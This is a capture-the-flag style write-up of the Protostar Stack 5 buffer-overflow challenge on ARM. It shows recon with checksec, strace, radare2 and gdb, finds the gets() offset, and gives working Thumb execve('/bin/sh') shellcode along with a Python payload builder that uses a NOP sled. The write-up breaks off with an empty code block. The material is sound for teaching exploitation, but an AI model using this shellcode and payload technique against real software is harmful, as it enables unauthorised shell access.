# Stack 5 - Protostar challenge
## Spawn shell

### Recon

First look for security mitigations reveals, that there 
are none of them:
```
$ checksec stack5
[*] '/tmp/stack5'
    Arch:     arm-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x10000)
    RWX:      Has RWX segments

```

Next step would be to gain some insight into stack5's 
control flow while executing it. Main question would be 
how to interact with program in RAM. Before any 
reversing attempts, let's call binary with ```strace``` 
for getting somw initial guess on possible injection 
vectors:

```
$ strace -i -f "./stack5"
[...]
[76fe821c] mprotect(0x76fb2000, 8192, PROT_READ) = 0
[76fe821c] mprotect(0x76ffe000, 4096, PROT_READ) = 0
[76fe81dc] munmap(0x76fb8000, 88642)    = 0
[76f33a08] fstat64(0, {st_mode=S_IFCHR|0620, 
st_rdev=makedev(136, 0), ...}) = 0
[76f3d174] brk(NULL)                    = 0x21000
[76f3d174] brk(0x42000)                 = 0x42000
[76f34698] read(0, 0x21150, 1024)       = ? ERESTARTSYS 
(To be restarted if SA_RESTART is set)
[76f34694] --- SIGWINCH {si_signo=SIGWINCH, 
si_code=SI_KERNEL} ---
[76f34698] read(0, AAAA
"AAAA\n", 1024)      = 5
[76f0f944] exit_group(0)                = ?
[????????] +++ exited with 0 +++
``` 
Ok, program is reading user input from stdin. Now it 
would be nice to know, if input gets sanitized or 
limited in its length or not.

I first took a look into imported functions from libc 
to find the path into binary that will be taken when 
reading from stdin
```
$ r2 -A ./stack5
[0x000102f4]> afl~imp
0x000102c4    1 12           sym.imp.gets
0x000102d0    1 12           sym.imp.__libc_start_main
0x000102e8    1 12           sym.imp.abort
sym.main 0x10438 [call] bl sym.imp.gets
```

So ```gets``` will be called by main at address 
0x10438. Let's seek to main focussing attention on
location where input get's stored in process memory:

```
0x00010430      sub r3, fp, 0x44
0x00010434      mov r0, r3
0x00010438      bl sym.imp.gets             ;[1] ; char*gets(char *s) 
```

First argument to gets is a pointer to location where 
input has to be stored. Disassemly above reveals, that 
it's 64 bytes away from fp, bingo! That means, that if 
we provide more 68 bytes as user input we should get 
segmentation fault as feedback. 

```
$ printf "A%0.s" {1..68} > /tmp/pattern ; printf "BBBB" >> /tmp/pattern
$ gdb --quiet -q ./stack5
(gdb) r < <(cat /tmp/pattern)
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ threads ]────
[#0] Id 1, Name: "stack5", stopped, reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x42424240 in ?? ()
```
QED. Program counter has to be 4-byte aligned, that's 
why second last bit in "BBBB" got cleared.

Knowing the offset from input buffer to return address  
we are able to craft our payload to gain control 
over pc register.

### Crafting payload
There are two main approaches we could follow along 
here:

- Simple return to payload attack
- bx_sp-approach

I will show both attempts. Keep reading...
First task while crafting payload would be to construct 
shellcode. Following snippet is an excerpt from radare2's disassembly view of the 16-bit shellcode listed below (Not GNU-Assembler conform syntax):

```
adr r0, 8
eors r1, r1
eors r2, r2
strb r2, [r0, 7]
movs r7, 0xb
svc 1
.string "/bin/shA" ; len=8 
```
Let's use snippet below and set a breakpoint at last instruction in 
```main```'s epilogue and determine address of our 
payload on stack. 

```python
#!/usr/bin/env python2

from __future__ import print_function
import struct

p=lambda x: struct.pack("<I",x)

offset=68

shellcode=b"\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x41"

nopsled=b"\x2d\x46"*512
payload = "A"*offset+p(0x42424242)+nopsled+shellcode
print(payload)
``` 

By the way: i used the approach to first write junk on stack and nopsled/shellcode after it. As en effect there's no restriction on length of buffer we provide. ALSR is deactivated this time, but if it was not, it would be useful to provide large enough buffer for using brute-force attempts for jumping into our own buffer later on.

```

```
